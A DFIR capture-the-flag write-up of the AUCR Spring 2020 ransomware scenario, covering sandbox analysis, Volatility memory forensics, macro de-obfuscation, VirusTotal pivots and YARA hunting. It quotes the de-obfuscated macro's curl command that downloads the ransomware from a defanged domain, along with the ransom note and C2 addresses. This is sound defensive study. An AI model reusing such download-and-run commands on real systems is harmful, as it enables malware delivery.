# AUCR Spring 2020 CTF Walkthrough

By [Matt Brenton](https://twitter.com/chupath1ngee) and [Matt DePaepe](https://twitter.com/mattdep_), competing as [SecIC](https://secic.org)

## Intro

AUCR (Analyst Unknown Cyber Range) is a CTF developed by [Wyatt Roersma](https://twitter.com/wyattroersma) located at [aucr.io](https://aucr.io). It is a DFIR CTF that typically requires analysis of memory images and/or pcaps for one or more computers to determine what happened. More information is available in the [AUCR Slack channel](https://join.slack.com/t/aucr/shared_invite/enQtMzI0MjU1MDg2MTMxLTQzODg4NzVjZjE3YTA0NzJhMGZiZDZkZGUzMGU3YTM5MjNhMjI0ZmRlOGZiMzJmYzc3ZGFkOGQzZDA3NzJhNjk).

## Scenario

The scenario can be found by logging in at [aucr.io](https://aucr.io), expanding the menu, selecting CTF, and selecting the event ID corresponding to AUCR2020 (you will need to register first). In this scenario Susan Jacobs received a phishing email that appears to have encrypted her files!

![victim screenshot](/20200607_AUCR_Spring_2020/images/01.png "victim screenshot")

For this scenario you are provided a memory image taken from Susan Jacob's computer and a packet capture of network traffic. Points are scored by submitting indicators for blocking, alerting, and resetting. 

## Recon

Having dealt with APT 111 in the past and suspecting they may attack again, we configured alerting for some of their known infrastructure prior to the beginning of the competition. Since the IPs correspond to Google cloud infrastructure we decided there was likely little to be gained from monitoring them, but we did configure alerts for updates to domains known to be associated with this threat group.

On June 7 we received alerts for a cnd777[.]co certificate registered around 6:41 AM CDT from [crt.sh](https://crt.sh/?q=cnd777.co) and Recorded Future:

![crt.sh screenshot](/20200607_AUCR_Spring_2020/images/02.png "crt.sh screenshot")

![Recorded Future screenshot](/20200607_AUCR_Spring_2020/images/03.png "Recorded Future screenshot")

## Malware Dynamic Analysis

Shortly after seeing the alert we ran the link in URLscan.io and observed a file named serv.exe.

![cnd777.co screenshot](/20200607_AUCR_Spring_2020/images/04.png "cnd777.co screenshot")

source: [https://urlscan.io/result/761616f9-a6fb-4199-9538-bc56d0d5c346](https://urlscan.io/result/761616f9-a6fb-4199-9538-bc56d0d5c346)

We ran the file in any.run to observe what would happen. The malware appeared to exit quickly and we didn’t observe anything malicious. We then modified the sandbox specs in any.run from a Windows 7 32-bit to a Windows 7 64-bit machine and [ran the sample again](https://app.any.run/tasks/b4ae66f3-ccb6-47cf-82e8-ed0a8cc1f6b1/).

We concluded the malware was ransomware based on the behavior exhibited in any.run:

![any.run screenshot](/20200607_AUCR_Spring_2020/images/05.png "any.run screenshot")

The malware made an HTTP get to hxxp://34.65.41[.]144/logo[.]jpg which contained a RSA public key and saved the file to C:\Users\admin\Downloads\1.priv

![logo.jpg screenshot](/20200607_AUCR_Spring_2020/images/06.png "logo.jpg screenshot")

source: [https://urlscan.io/result/ef8e680a-ebc6-4655-9944-320408a5729b](https://urlscan.io/result/ef8e680a-ebc6-4655-9944-320408a5729b)

We determined this was the public key used to encrypt files on the compromised system.

![any.run screenshot](/20200607_AUCR_Spring_2020/images/07.png "any.run screenshot")

Shortly after we discovered the ransomware note located at C:\Users\admin\Downloads\NOTICE.txt

![any.run screenshot](/20200607_AUCR_Spring_2020/images/08.png "any.run screenshot")

`ALL YOUR FILES HAVE BEEN ENCRYPTED AND YOU MUST PAY TO DECRYPT THEM.
PAY ONLY 1 B1TC01N TO GET BACK ALL OF YOUR FILES.
THE PRICE GOES UP IN 72 HOURS SO PROCEED QUICKLY.
SEND MONEY NOW.
https://bitcoin.org/en/getting-started
SEND 1 B1TC01N  TO b21qar0srrr7xfwvy5l687lydnw3re59gtzzwf5md`

This confirmed that we were dealing with a ransomware attack.

We re-ran the ransomware with the “FakeNet” option (all HTTP requests will be responded with 404 error code).  This option would block the HTTP GET to download the public certificate.  With the “FakeNet” option enabled, we observed that the ransomware did not encrypt the files on the system but did leave the NOTICE.txt file.

![any.run screenshot](/20200607_AUCR_Spring_2020/images/09.png "any.run screenshot")

![any.run screenshot](/20200607_AUCR_Spring_2020/images/10.png "any.run screenshot")

source: [https://app.any.run/tasks/281c097a-02b7-4586-baa3-b52b4985bacc/](https://app.any.run/tasks/281c097a-02b7-4586-baa3-b52b4985bacc/)

We observed the malware had been UPX packed so we unpacked it which allowed us to run strings. The MD5 hash of the unpacked serv.exe file is 857b2659295a8e333d1b7509e72635f2.

## Memory Analysis

### Volatility

We used Volatility with the profile Win10x64_18362 to run various plugins against the memory image. We decided to use Volatility 2.6 since it is the latest stable version and the version with which we are most familiar.

`pstree` showed that the malware had been launched from Excel, which is consistent with what Susan Jacobs reported.

![pstree screenshot](/20200607_AUCR_Spring_2020/images/11.png "pstree screenshot")

Next we used `dumpfiles` to dump all files from EXCEL.EXE (PID 5984):

`python2 ~/volatility/vol.py -f windows10-06d3ea61.vmem --profile=Win10x64_18362 dumpfiles --dump-dir=./export/5984 -n -u -p 5984`

We grepped for the string "xls" in the dumpfiles export and matched on 3 files.

![grep xls screenshot](/20200607_AUCR_Spring_2020/images/12.png "grep xls screenshot")

Using `file` revealed two of the results appeared to be Excel documents.

![file screenshot](/20200607_AUCR_Spring_2020/images/13.png "file screenshot")

We uploaded `file.5984.0xffffc50c5c0d02b0.voice29028template.xlsm.dat` (MD5: c0e21d74f318bedd2dc10f3cc8c0f307) into any.run and were able to de-obfuscate the malicious macro.

source: [https://app.any.run/tasks/9193d841-0268-4adc-8c7d-f7d3fcd08098/](https://app.any.run/tasks/9193d841-0268-4adc-8c7d-f7d3fcd08098/)

Screenshot of the Excel Document:

![excel doc screenshot](/20200607_AUCR_Spring_2020/images/14.png "excel doc screenshot")

Obfuscated Macro:

![obfuscated macro screenshot](/20200607_AUCR_Spring_2020/images/15.png "obfuscated macro screenshot")

We de-obfuscated the macro by replacing “FFF” and “BBB” with an empty character using [every analyst's favorite tool for sharing data with GCHQ](https://gchq.github.io/CyberChef/).

De-obfuscated Macro:

![de-obfuscated macro screenshot](/20200607_AUCR_Spring_2020/images/16.png "de-obfuscated macro screenshot")

In the results we identified the string that downloads the ransomware, confirming our earlier findings from dynamic analysis.

`curl.exe hXXps://cnd777[.]co/serv.exe -o serv.exe --ssl-no-revoke`

### Strings
“Always run strings, man” - [Joseph Ten Eyck](https://twitter.com/joseph_teneyck)

![did you run strings?](/20200607_AUCR_Spring_2020/images/17.png "did you run strings?")

We converted the memory image to strings and grepped for interesting strings. The first was cnd777 which revealed the command executed on the infected computer to pull down the malware:
 
![grep cnd777 strings screenshot](/20200607_AUCR_Spring_2020/images/18.png "grep cnd777 strings screenshot")

Searching for logo.jpg revealed the two IPs that were hosting the RSA key, 34.65.41[.]144 and 35.228.94[.]72:

![grep logo.jpg strings screenshot](/20200607_AUCR_Spring_2020/images/19.png "grep logo.jpg strings screenshot")

We attempted to find the sender of the email containing the maldoc but were ultimately unsuccessful, we suspect the memory image did not capture the malicious email.

## Pivoting
### VirusTotal
While performing dynamic analysis of the malware we had several indicators off of which we could pivot:
 
| Name | Description |
|---|---|
| cnd777[.]co | Domain hosting serv.exe ransomware |
| 35.193.210[.]200 | IP address for cnd777[.]co |
| 34.65.41[.]144 | IP address for logo[.]jpg containing RSA key |
| 5788757e2bb6ea12b43d05fd2ebc669b | MD5 hash for serv.exe ransomware |
| 4bd7cc02499d2cdbca58f65bfc0a5c08 | MD5 hash for NOTICE.txt ransomware note |

We started by looking up the ransomware hash and found it in Virustotal.

![virustotal screenshot](/20200607_AUCR_Spring_2020/images/20.png "virustotal screenshot")

Source: [https://www.virustotal.com/gui/file/d1a04c31f0a0c13158ed40e14e2693223ebec092536ea8fc6d6226402185c2ca/details] (https://www.virustotal.com/gui/file/d1a04c31f0a0c13158ed40e14e2693223ebec092536ea8fc6d6226402185c2ca/details)

We were able to identify an additional malicious IP 35.228.94[.]72 contacted by the malware (at the time of analysis there were fewer IPs listed as related). We confirmed the IP was related by grepping for it in the strings of the memory image:

![grep ip screenshot](/20200607_AUCR_Spring_2020/images/21.png "grep ip screenshot")

Additional artifacts were found by looking at relations for the IPs found in dynamic analysis of the malware.

34.65.41[.]144 yielded multiple submissions of interest.

![virustotal relations screenshot](/20200607_AUCR_Spring_2020/images/22.png "virustotal relations screenshot")

source: [https://www.virustotal.com/gui/ip-address/34.65.41.144/relations](https://www.virustotal.com/gui/ip-address/34.65.41.144/relations)

35.193.210[.]200 didn’t have any related files, but had historically been associated with another domain. APT 111 in a campaign from October 2019 perhaps? What a coincidence, there just happened to be an AUCR at that time for GrrCON 2019!

![virustotal relations screenshot](/20200607_AUCR_Spring_2020/images/23.png "virustotal relations screenshot")

source: [https://www.virustotal.com/gui/ip-address/35.193.210.200/relations](https://www.virustotal.com/gui/ip-address/35.193.210.200/relations)

### AUCR

**Utilizing the AUCR platform is the key to success in this competition.** This is done by creating YARA rules which are run against the contents of UNUM.

We wrote a YARA rule based on known bad network indicators (cnd777[.]co and the three IPs).

![aucr screenshot](/20200607_AUCR_Spring_2020/images/24.png "aucr screenshot")

This identified five submissions in UNUM:

![aucr screenshot](/20200607_AUCR_Spring_2020/images/25.png "aucr screenshot")

Another YARA rule looked for submissions related to the ransomware note by searching for the bitcoin address or NOTICE.txt.

![aucr screenshot](/20200607_AUCR_Spring_2020/images/26.png "aucr screenshot")

This identified four submissions overlapping with the previous rule, indicating those were highly likely to be the same threat actor.

![aucr screenshot](/20200607_AUCR_Spring_2020/images/27.png "aucr screenshot")

## Conclusion

Thanks for taking the time to read our writeup for the AUCR Spring 2020 CTF. We intentionally did not provide _all_ the answers in the hope that readers would be inspired to find the remainder on their own. 

See you at the next AUCR!

## Credits

Team [SecIC](https://secic.org) for AUCR Spring 2020 consisted of [Matt Brenton](https://twitter.com/chupath1ngee) and [Matt DePaepe](https://twitter.com/mattdep_)

[AUCR](https://aucr.io) scenario created by [Wyatt Roersma](https://twitter.com/wyattroersma)

Join us on the [AUCR Slack channel](https://join.slack.com/t/aucr/shared_invite/enQtMzI0MjU1MDg2MTMxLTQzODg4NzVjZjE3YTA0NzJhMGZiZDZkZGUzMGU3YTM5MjNhMjI0ZmRlOGZiMzJmYzc3ZGFkOGQzZDA3NzJhNjk)!